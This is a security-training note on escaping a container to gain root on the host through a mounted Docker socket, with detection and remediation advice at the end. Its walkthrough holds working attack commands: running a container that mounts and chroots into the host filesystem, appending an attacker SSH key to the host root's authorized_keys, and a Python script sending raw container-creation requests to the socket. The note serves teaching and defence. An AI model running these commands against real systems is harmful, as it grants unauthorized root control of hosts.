---
tags: [docker, socket, privilege-escalation, container-escape, dind]
difficulty: intermediate
module: "38 - Container and Kubernetes Security"
topic: "38.03 Docker Socket"
---

# 03 - Docker Socket Mount Privilege Escalation

## Introduction

In the Docker ecosystem, the primary method for the Docker client (the CLI tool) to communicate with the Docker daemon (`dockerd`) is through a local Unix domain socket, almost universally located at `/var/run/docker.sock`. This socket acts as the main API endpoint for managing the entire lifecycle of containers, images, networks, and volumes on the host system. 

A very common, yet extremely dangerous, anti-pattern in containerized architectures is mounting this host socket directly into a container. This is frequently done to allow a container to monitor, manage, or orchestrate other containers. Common valid use cases include CI/CD runners (like Jenkins, GitLab Runner, or GitHub Actions needing to build Docker images), infrastructure monitoring agents (like Datadog, Prometheus, or New Relic), or management dashboards (like Portainer).

However, when `/var/run/docker.sock` is mounted into a container, that container effectively possesses the exact same privileges as the `root` user on the host operating system. This note explores the mechanics of this vulnerability, how an attacker exploits it, and how it leads directly to a catastrophic container escape and complete host takeover.

## Vulnerability Mechanics

Unix domain sockets are a form of inter-process communication (IPC) that allow processes on the same host system to exchange data. When a process writes HTTP REST data to `/var/run/docker.sock`, the Linux kernel passes that data directly to the Docker daemon. The daemon, which generally runs as `root`, implicitly trusts requests coming over this local socket.

If a container has this socket mounted via a volume bind (`-v /var/run/docker.sock:/var/run/docker.sock`), any user inside the container who has read/write permissions to that socket file can send REST API commands directly to the host's Docker daemon. Since the daemon has the power to launch new containers with arbitrary configurations (such as mounting the host's absolute root filesystem or adding extreme capabilities), an attacker inside the compromised container can simply ask the daemon to create a new, malicious container specifically designed to compromise the host.

### Attack Architecture Diagram

```text
+-------------------------------------------------------------------------------+
|                               HOST OPERATING SYSTEM                           |
|                                                                               |
|  +---------------------------+             +-------------------------------+  |
|  |     COMPROMISED CONT.     |             |    DOCKER DAEMON (Root)       |  |
|  |                           |             |                               |  |
|  |  (Attacker gets shell)    |             |  Listens on:                  |  |
|  |                           |             |  /var/run/docker.sock         |  |
|  |  $ docker run -v /:/host  |======(2)======>                             |  |
|  |                           |   Unix      |                               |  |
|  +---------------------------+   Socket    +-------------------------------+  |
|               |                    |                      |                   |
|              (1) Mount: -v /var/run/docker.sock:/var/run/docker.sock          |
|               |                    |                      |                   |
|               v                    v                      v                   |
|  +-------------------------------------------------------------------------+  |
|  |                              Unix Socket                                |  |
|  |                        /var/run/docker.sock                             |  |
|  +-------------------------------------------------------------------------+  |
|                                                                               |
|                                       (3) Daemon creates new container        |
|                                       v                                       |
|  +-------------------------------------------------------------------------+  |
|  |                         MALICIOUS NEW CONTAINER                         |  |
|  |                         - Mounts Host Root (/) to /hostfs               |  |
|  |                         - Chroots into /hostfs                          |  |
|  |                         - Attacker achieves Root RCE on Host            |  |
|  +-------------------------------------------------------------------------+  |
+-------------------------------------------------------------------------------+
```

## Exploitation Walkthrough

Assume you have gained a low-privileged shell inside a container (for example, via an RCE vulnerability in a web application like WordPress or a Spring Boot app). Your immediate goal is to determine if you can escape this isolation to the underlying host.

### Step 1: Enumeration and Discovery

First, check if the Docker socket is mounted inside the container. You can look for the file directly or check the active mount points.

```bash
# Check if the file exists directly
ls -la /var/run/docker.sock
srw-rw---- 1 root docker 0 Jun 9 10:00 /var/run/docker.sock

# Alternatively, check mount points for the socket
mount | grep docker.sock
```

If the socket is present, you must verify that your current user has permissions to interact with it. The socket is usually owned by `root` and the `docker` group. If your container user is `root`, or a member of the `docker` group, you can proceed.

You can test connectivity by sending a raw HTTP GET request to the socket using `curl` (if installed):

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```
If this returns a JSON array of images residing on the host, the socket is fully functional and exploitable.

### Step 2: Obtaining the Docker Client

To easily exploit the socket, it is highly recommended to use the official Docker client binary. Writing raw JSON HTTP payloads by hand is tedious. If the `docker` binary is not already installed in the container, you can download a statically compiled version from Docker's official archives.

```bash
# Download a static docker client (adjust version and architecture as needed)
wget https://download.docker.com/linux/static/stable/x86_64/docker-20.10.9.tgz
tar xzvf docker-20.10.9.tgz
cp docker/docker /tmp/docker
chmod +x /tmp/docker
```

### Step 3: Container Escape and Host Takeover

With the docker client ready, the exploitation phase is practically identical to exploiting an exposed TCP daemon. You ask the host's Docker daemon to spawn a new container, but this time you instruct it to mount the host's absolute root directory (`/`) into the new container's filesystem.

```bash
/tmp/docker -H unix:///var/run/docker.sock run -it -v /:/hostfs alpine chroot /hostfs /bin/bash
```

If the environment lacks interactive TTY support (e.g., you are executing via a blind RCE or a reverse shell that drops TTY), you can use a detached one-liner to deploy a container that writes a reverse shell to the host's crontab or adds an SSH key.

**Adding an SSH Key to the Host (Blind Exploitation):**
```bash
/tmp/docker run -v /root:/hostroot alpine sh -c "echo 'ssh-rsa AAAAB3NzaC1... attacker@kali' >> /hostroot/.ssh/authorized_keys"
```
After executing this, you can SSH directly into the host machine as the root user.

## Advanced Techniques

### The "DooD" (Docker-out-of-Docker) Technique
What we just described is often referred to as Docker-out-of-Docker (DooD). Instead of running a heavy, nested Docker daemon inside the container (true Docker-in-Docker or DinD), we simply mount the socket to control the sibling containers and the host daemon. This is cleaner, requires fewer privileges for the initial container, and is much faster for attackers.

### Interacting Without the Docker Binary
If the container lacks `curl`, `wget`, or the ability to download the docker binary (e.g., heavily isolated network, strict egress filtering, read-only filesystem), you can interact with the socket directly using raw Python, Perl, or even Bash by writing directly to the file descriptor.

**Python 3 Example:**
```python
import socket
import json

# Connect to the Unix socket
sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
sock.connect('/var/run/docker.sock')

# Crafting a raw HTTP request to create a malicious container
request = """POST /v1.40/containers/create HTTP/1.1\r
Host: localhost\r
Content-Type: application/json\r
Content-Length: 174\r
\r
{"Image": "alpine", "Cmd": ["chroot", "/mnt", "/bin/sh"], "HostConfig": {"Binds": ["/:/mnt"]}}"""

sock.sendall(request.encode())
response = sock.recv(4096)
print(response.decode())
# Extract the returned Container ID from the JSON response and send a /start request next
```

## Detection and Mitigation

### Detection Strategies
- **Container Introspection:** Security tools (like Falco, Tetragon) can monitor kernel syscalls. If a container that usually runs a web app suddenly executes the `docker` binary or makes `connect()` syscalls specifically targeting `/var/run/docker.sock`, it indicates a severe compromise.
- **Audit Logs:** Monitor Docker daemon logs for unexpected container creations, specifically those mounting `/` or running with `--privileged`, originating from local socket requests rather than the management plane.

### Remediation Strategies
1. **Avoid Socket Mounting:** The best defense is to completely avoid mounting the Docker socket into containers. If a container needs to build images (e.g., Jenkins), consider using daemonless tools like `Kaniko`, `Buildah`, or `Makisu` which do not require Docker socket access at all.
2. **Rootless Docker:** Running the Docker daemon in Rootless mode ensures that even if an attacker compromises the socket, the daemon itself is running as an unprivileged user on the host, severely limiting the impact of the filesystem escape.
3. **TCP with mTLS Authorization:** If containers must communicate with the daemon, configure the daemon to listen on a TCP port with mutual TLS, and provide specific client certificates to the containers. This adds a layer of authentication and authorization, and you can restrict which API endpoints the certificate can access.
4. **Sysbox / True DinD:** If you must run Docker inside a container, use modern runtimes like Sysbox that provide highly isolated, secure nested container environments without exposing the host socket.

## Chaining Opportunities
- **Command Injection -> Host Takeover:** A simple command injection flaw in a containerized web application can be immediately escalated to full host compromise if the socket is mounted, bypassing the need for kernel exploits.
- **SSRF -> Socket Interaction:** In rare cases, an SSRF vulnerability can be coerced into writing to local Unix sockets (e.g., using `gopher://` payloads), bypassing the need for direct code execution entirely.

## Related Notes
- [[01 - Docker Overview — Images, Containers, Registries]]
- [[02 - Docker Daemon Exposed]]
- [[04 - Container Escape — Privileged Container]]
- [[05 - Container Escape — Mounted Host Filesystem]]
